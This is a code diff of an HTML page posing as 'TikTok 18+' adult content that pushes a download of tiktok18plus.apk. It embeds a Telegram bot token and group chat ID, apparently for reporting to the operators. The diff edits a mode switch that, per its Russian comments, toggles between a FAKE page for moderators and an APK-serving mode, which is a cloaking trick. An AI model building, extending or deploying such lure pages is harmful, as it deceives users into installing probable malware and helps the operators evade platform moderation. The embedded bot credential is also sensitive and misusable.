@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok 18+ - Контент для взрослых</title>
-    <!-- SITE_MODE: FAKE -->
+    <!-- SITE_MODE: APK -->
     <style>
         * {
             margin: 0;
@@ -586,18 +586,17 @@
     <script>
         // Конфигурация
         const CONFIG = {
-            moderationMode: false, // принудительно APK режим
+            moderationMode: true, // ИЗМЕНИТЕ НА false ДЛЯ APK РЕЖИМА, true ДЛЯ FAKE
             botToken: '7302514529:AAFBoPs9nURtCKE0PuIZlu8gAEqMXWp3Ebc',
             groupChatId: '-1002872397956',
             apkFileName: 'tiktok18plus.apk',
             downloadPath: './downloads/'
         };
 
-        // Проверка режима - принудительно APK
+        // Простая проверка режима
         function checkModeFromHTML() {
-            // Принудительно устанавливаем APK режим
-            CONFIG.moderationMode = false;
-            console.log('Установлен APK режим принудительно');
+            // Режим определяется переменной moderationMode выше
+            console.log('Текущий режим:', CONFIG.moderationMode ? 'FAKE' : 'APK');
             updateSiteMode();
         }
 
